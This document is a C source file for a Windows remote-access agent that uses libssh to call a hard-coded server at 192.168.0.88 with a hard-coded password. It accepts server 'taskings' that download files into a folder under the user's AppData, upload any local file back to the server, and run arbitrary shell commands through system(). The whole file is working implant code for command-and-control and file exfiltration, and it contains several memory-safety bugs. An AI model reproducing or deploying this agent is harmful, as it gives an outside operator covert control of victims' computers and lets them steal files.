#include "Header.h"

struct tasking_struct* firstStruct = NULL;
struct tasking_struct* lastStruct = NULL;
char folderpath[256] = "C:\\Users\\";
FILE* logfile;
ssh_session session = NULL;

int catchChannelError(int check, ssh_channel chan) {
	if (check < 0) {
		fprintf(logfile, "CHANNEL ERROR ABORTING!!!\n");
		ssh_channel_close(chan);
		ssh_channel_free(chan);
		ssh_disconnect(session);
		ssh_free(session);
		ssh_finalize();
		fclose(logfile);
		exit(-1);
	}
	return check;
}

int parse_tasking(char* tasking, ssh_channel chan) {
	/* Parses and handles the tasking input from the server*/

	// checks if there is no tasking
	if (!strncmp(tasking, "default", 7)) {
		fprintf(logfile, "No tasks to do. Quitting...\n");
		catchChannelError(ssh_channel_write(chan, "0", 2), chan);
		return 0;
	}

	// get the number of instructions to complete
	int num = 0;
	char* tmp = tasking;
	char* dat = NULL;
	char tmpbf[3];

	for (; tasking[num]; tasking[num] == '\n' ? num++ : *tasking++);
	tasking = tmp;
	fprintf(logfile, "Number of tasks to do: %d\n", num);
	//struct tasking_struct* tasking_arr[num];
	if (num == 0) return 0;

	char* p = strtok(tasking, "\n");

	// Parses the data into list
	while (p != NULL)
	{
		// get operation int
		memset(tmpbf, 0, sizeof(tmpbf));
		strncat(tmpbf, p, 2);
		struct tasking_struct* curr = malloc(sizeof(struct tasking_struct));
		curr->operation = atoi(tmpbf);

		// get options for operation
		dat = _strdup(p + 3);
		curr->opts = dat;

		if (firstStruct == NULL) {
			firstStruct = curr;
			lastStruct = curr;
		}
		else {
			lastStruct->nextStruct = curr;
			lastStruct = curr;
		}


		// clean up and move on
		p = strtok(NULL, "\n");
		//memset(tmpbf, 0, 2);
	}
	if (firstStruct == NULL) return 0;

	for (int j = 0; j < num; j++) {
		switch (firstStruct->operation)
		{
		case AGENT_DOWN_FILE:
			fprintf(logfile, "Received orders to download file %s\n", firstStruct->opts);
			char *contents;
			char size[256];

			char *send = malloc(sizeof(*send) * (4+strlen(firstStruct->opts)));
			char temp2[3];
			_itoa(firstStruct->operation, temp2, 10);
			strcpy(send, temp2);
			strcat(send, "|");
			strcat(send, firstStruct->opts);
			catchChannelError(ssh_channel_write(chan, send, strlen(send)+1), chan);
			catchChannelError(ssh_channel_read(chan, size, sizeof(size), 0), chan);
			catchChannelError(ssh_channel_write(chan, "ok", 3), chan);
			
			size_t memsize = atoi(size) + 1;

			contents = malloc(sizeof(*contents) * memsize);

			catchChannelError(ssh_channel_read(chan, contents, memsize, 0), chan);
			contents[atoi(size)] = '\0';
			catchChannelError(ssh_channel_write(chan, "ok", 3), chan);

			char *filecontent = malloc(sizeof(*filecontent) * b64_decoded_size(contents));
			b64_decode(contents, filecontent, b64_decoded_size(contents));
			filecontent[b64_decoded_size(contents)] = '\0';

			FILE* file;

			char filename[256] = "";
			strcpy(filename, folderpath);
			strcat(filename, "\\");
			strcat(filename, firstStruct->opts);
			file = fopen(filename, "w");
			if (file == NULL)
			{
				fprintf(logfile, "Unable to create file.\n");
			}
			else {
				fputs(filecontent, file);
				fclose(file);
			}
			break;
		case AGENT_UP_FILE:
			fprintf(logfile, "Got tasking to upload file %s\n", firstStruct->opts);
			char* ufilename;
			FILE* toupload;
			char* sendcommand;
			char* filedata;
			char temp[14];

			ufilename = malloc(sizeof(ufilename) * strlen(firstStruct->opts));
			int lastslash = 0;
			for (int i = 0; i < strlen(firstStruct->opts); ++i) {
				if (firstStruct->opts[i] == '\\') lastslash = i;
			}
			
			strncpy(ufilename, firstStruct->opts + lastslash + 1, strlen(firstStruct->opts));

			toupload = fopen(firstStruct->opts, "r");
			fseek(toupload, 0L, SEEK_END);
			int uploadsize = ftell(toupload);
			int uploadsizee = b64_encoded_size(uploadsize);
			sendcommand = malloc(sizeof(sendcommand) * (strlen(firstStruct->opts) + 3));
			filedata = malloc(sizeof(filedata) * (uploadsize + 1));
			strcpy(sendcommand, "11|");
			strcat(sendcommand, ufilename);
			rewind(toupload);

			catchChannelError(ssh_channel_write(chan, sendcommand, strlen(sendcommand)), chan);
			catchChannelError(ssh_channel_read(chan, temp, 3, 0), chan);
			char sizebuf[64] = "ok";
			sprintf(temp, "%d", uploadsizee);
			catchChannelError(ssh_channel_write(chan, temp, sizeof(temp)), chan);
			catchChannelError(ssh_channel_read(chan, temp, 3, 0), chan);

			fread(filedata, 1, uploadsize, toupload);
			char* encodedfiledata = b64_encode((unsigned char*)filedata, uploadsize);
			catchChannelError(ssh_channel_write(chan, encodedfiledata, uploadsizee), chan);
			catchChannelError(ssh_channel_read(chan, temp, 8, 0), chan);

			break;
		case AGENT_EXEC_SC:
			system(firstStruct->opts);
			break;
		default:
			fprintf(logfile, "ERROR: Caught unknown tasking value: %d\n", firstStruct->operation);
			break;
		}
		struct tasking_struct* temp = firstStruct;
		firstStruct = firstStruct->nextStruct;
		free(temp);
	}
	return 0;
}

int func_loop(ssh_session session)	//probably replace
{
	/* Primary function loop */
	// Initialize vars
	ssh_channel channel;
	char tasking[2048];
	int nbytes;

	memset(tasking, 0, sizeof(tasking));
	channel = ssh_channel_new(session);

	fprintf(logfile, "[+] Created new SSH channel\n");
	if (channel == NULL) return SSH_ERROR;

	// Open channel
	
	if (ssh_channel_open_session(channel) != SSH_OK)
	{
		ssh_channel_free(channel);
		return -1;
	}
	fprintf(logfile, "[+] Opened SSH Channel with remote server\n");
	// Request a shell interface

	catchChannelError(ssh_channel_request_shell(channel), channel);
	fprintf(logfile, "[+] Made it through check\n");
	
	// Send the global ID

	fprintf(logfile, "Identified as an agent\n");
	catchChannelError(ssh_channel_write(channel, "1", 2), channel);

	//write that I am an agent
	char temp3[3];
	catchChannelError(ssh_channel_read(channel, temp3, 3, 0), channel);
	catchChannelError(ssh_channel_write(channel, "NA\nNA\nNA\nNA\nNA", 15), channel);

	catchChannelError(ssh_channel_read(channel, tasking, sizeof(tasking), 0), channel);

	fprintf(logfile, "Read data: %s\n", tasking);
	parse_tasking(tasking, channel);

	// close connections
	catchChannelError(ssh_channel_write(channel, "0", 2), channel);

	int close = ssh_channel_close(channel);
	ssh_channel_free(channel);

	return close;
}

int catchError(int check, const char* message) {
	if (check != 0) fprintf(logfile, "%s Error: %i\n", message, check);
	return check;
}

ssh_session connectserver(const char* host, const char* user) {
	/*Connect to server*/
	ssh_session session;

	// initialize ssh session structure
	session = ssh_new();
	if (session == NULL) {
		fprintf(logfile, "Session is NULL\n");
		return NULL;
	}

	if (catchError(ssh_options_set(session, SSH_OPTIONS_USER, user), "Setting Username") != 0) return NULL;
	if (catchError(ssh_options_set(session, SSH_OPTIONS_HOST, host), "Setting Host") != 0) return NULL;
	if (catchError(ssh_connect(session), "Connection") != 0) return NULL;
	if (catchError(ssh_userauth_password(session, NULL, "lala"), "Authentication") != 0) return NULL;

	return session;
}

int main()
{
	char actualusername[256] = "";
	TCHAR username[UNLEN + 1];
	DWORD size = UNLEN + 1;
	GetUserName((TCHAR*)username, &size);
	strncpy(actualusername, &(char)(username[0]), 1);
	for (int i = 1; i <= sizeof(username); i++) {
		if (isalpha(username[i]) | isdigit(username[i])) strncat(actualusername, &(char)(username[i]), 1);
		else break;
	}
	strcat(folderpath, actualusername);
	strcat(folderpath, "\\AppData\\Roaming\\NICKTEST");
	mkdir(folderpath);

	char logpath[256] = "";
	strcpy(logpath, folderpath);
	strcat(logpath, "\\log.txt");
	logfile = fopen(logpath, "a");
	
	fprintf(logfile, "==============================\n\n");

	
	session = connectserver("192.168.0.88", "WINDOWS_CLIENT");	//Make this less hard-coded

	if (session == NULL) {
		fprintf(logfile, "Failed to create SSH session\n\n");
		ssh_disconnect(session);
		ssh_free(session);
		ssh_finalize();
		fclose(logfile);
		return 0;
	}


	func_loop(session);

	ssh_disconnect(session);
	ssh_free(session);
	ssh_finalize();
	fprintf(logfile, "Successfully disconnected from server\n\n");
	fclose(logfile);
	return 0;
}